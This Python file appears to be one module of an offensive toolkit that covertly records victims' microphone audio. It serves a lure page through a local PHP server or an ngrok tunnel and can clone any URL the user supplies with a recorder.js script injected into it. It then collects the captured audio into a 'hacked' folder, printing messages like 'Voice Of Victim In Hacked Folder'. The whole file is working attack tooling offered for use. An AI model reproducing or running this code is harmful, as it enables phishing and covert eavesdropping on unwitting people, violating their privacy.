def mice():
    from colorama import Fore , Style
    import time , os , sys , platform , subprocess , random , threading , psutil , datetime , requests
    from modules import banners
    banners.mice_banner()
    time.sleep(0.1)
    banners.mice_menu()
    select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)

    def default():
        os.chdir("attacks")
        os.chdir("mice")
        port = random.choice(range(1011,9999))
        def clear():
            if "Windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        banners.hacking_menu()
        select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)
        if select == "1":
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            clear()
            x=5
            while x:
                banners.hacking()
                print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Localhost started , Port : {port}")
                input(Fore.LIGHTYELLOW_EX + "\033[1m" + f"\n    *TO STOP THE SERVER PRESS ENTER*")
                y_n = input(Fore.LIGHTRED_EX + "\033[1m" + f"\n    Are you Sure ? [ y / n ] "+ "\033[0m").lower()
                if y_n == "n":
                    clear()
                else:
                    x=0
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Voice Of Victim In Hacked Folder...")
            voice_list = []
            if "Windows" in platform.uname():
                file_list = subprocess.getoutput("dir /b")
            else:
                file_list = subprocess.getoutput("ls")
            for voice in file_list.split(sep="\n"):
                if ".wav" in voice or "mp3" in voice:
                    voice_list.append(voice)
            voice_data = []
            for i in voice_list:
                data_ = open(i , mode="rb").read()
                voice_data.append(data_)
            for name in voice_list:
                os.remove(name)
            os.chdir("../../hacked")
            for data__ in voice_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.wav","wb").write(data__)
            time.sleep(1)
            clear()
            os.chdir("..")
        elif select == "2":
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Running Ngrok On {port} , Please Wait...")
            time.sleep(2)
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            os.system(f"ngrok http {port}")
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Voice Of Victim In Hacked Folder...")
            voice_list = []
            if "Windows" in platform.uname():
                file_list = subprocess.getoutput("dir /b")
            else:
                file_list = subprocess.getoutput("ls")
            for voice in file_list.split(sep="\n"):
                if ".wav" in voice or "mp3" in voice:
                    voice_list.append(voice)
            voice_data = []
            for i in voice_list:
                data_ = open(i , mode="rb").read()
                voice_data.append(data_)
            for name in voice_list:
                os.remove(name)
            os.chdir("../../hacked")
            for data__ in voice_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.wav","wb").write(data__)
            time.sleep(1)
            clear()
            os.chdir("..")
        else:
            os.chdir("../..")
    
    def custom():
        os.chdir("attacks")
        os.chdir("mice")
        os.chdir("customize")
        def clear():
            if "windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        url = input(Fore.LIGHTGREEN_EX + "\033[1m" + "\n    Please Enter The Url : "+ "\033[0m" + Fore.LIGHTRED_EX )
        print(Fore.LIGHTYELLOW_EX + "\n    Preparing The Page....")
        respone = requests.get(url=url).text
        script = open("sors.txt","r").read()
        sorse = f"""
<head>
<body>
<h1></h1>

<div id="controls">
<button id="redButton" disabled></button> 

</div>
<!-- inserting these scripts at the end to be able to use all the elements in the DOM -->
<script src="https://cdn.rawgit.com/mattdiamond/Recorderjs/08e7abd9/dist/recorder.js"></script>
<script src="js/app.js"></script>

</body>
</head>
{respone}"""
        open("index.html",mode="w").write(sorse)
        time.sleep(1.5)
        port = random.choice(range(1011,9999))
        def clear():
            if "windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        banners.hacking_menu2()
        select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)
        if select == "1":
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            clear()
            x=5
            while x:
                banners.hacking()
                print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Localhost started , Port : {port}")
                input(Fore.LIGHTYELLOW_EX + "\033[1m" + f"\n    *TO STOP THE SERVER PRESS ENTER*")
                y_n = input(Fore.LIGHTRED_EX + "\033[1m" + f"\n    Are you Sure ? [ y / n ] "+ "\033[0m").lower()
                if y_n == "n":
                    clear()
                else:
                    x=0
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Voice Of Victim In Hacked Folder...")
            voice_list = []
            if "Windows" in platform.uname():
                file_list = subprocess.getoutput("dir /b")
            else:
                file_list = subprocess.getoutput("ls")
            for voice in file_list.split(sep="\n"):
                if ".wav" in voice or "mp3" in voice:
                    voice_list.append(voice)
            voice_data = []
            for i in voice_list:
                data_ = open(i , mode="rb").read()
                voice_data.append(data_)
            for name in voice_list:
                os.remove(name)
            os.chdir("../../../hacked")
            for data__ in voice_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.wav","wb").write(data__)
            time.sleep(1)
            clear()
            os.chdir("..")
        elif select == "2":
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Running Ngrok On {port} , Please Wait...")
            time.sleep(2)
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            os.system(f"ngrok http {port}")
            php_server_process.terminate()
            clear()
            banners.hacking()
            input(Fore.LIGHTGREEN_EX + "\n    Finished , Voice Of Victim In Hacked Folder...")
            voice_list = []
            if "Windows" in platform.uname():
                file_list = subprocess.getoutput("dir /b")
            else:
                file_list = subprocess.getoutput("ls")
            for voice in file_list.split(sep="\n"):
                if ".wav" in voice or "mp3" in voice:
                    voice_list.append(voice)
            voice_data = []
            for i in voice_list:
                data_ = open(i , mode="rb").read()
                voice_data.append(data_)
            for name in voice_list:
                os.remove(name)
            os.chdir("../../../hacked")
            for data__ in voice_data:
                time_now = datetime.datetime.now()
                open(f"{time_now}.wav","wb").write(data__)
            time.sleep(1)
            clear()
            os.chdir("..")
        else:
            os.chdir("../../..")


    if select == "1":
        default()
    elif select == "2":
        custom()
    else:
        pass